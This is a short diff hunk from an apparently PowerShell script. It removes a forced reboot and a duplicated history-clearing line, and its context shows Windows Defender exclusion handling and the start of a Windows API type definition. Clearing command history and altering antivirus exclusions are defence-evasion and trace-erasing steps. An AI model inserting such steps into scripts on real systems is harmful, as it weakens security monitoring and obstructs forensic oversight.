@@ -130,10 +130,6 @@ Remove-MpPreference -ExclusionPath $dir
 Clear-History
 
 # Reboot the system
-Restart-Computer -Force
-Clear-History
-
-# Reboot the system
 # Define the constant values from the Windows API
 $WinAPI = Add-Type -TypeDefinition @"
 using System;
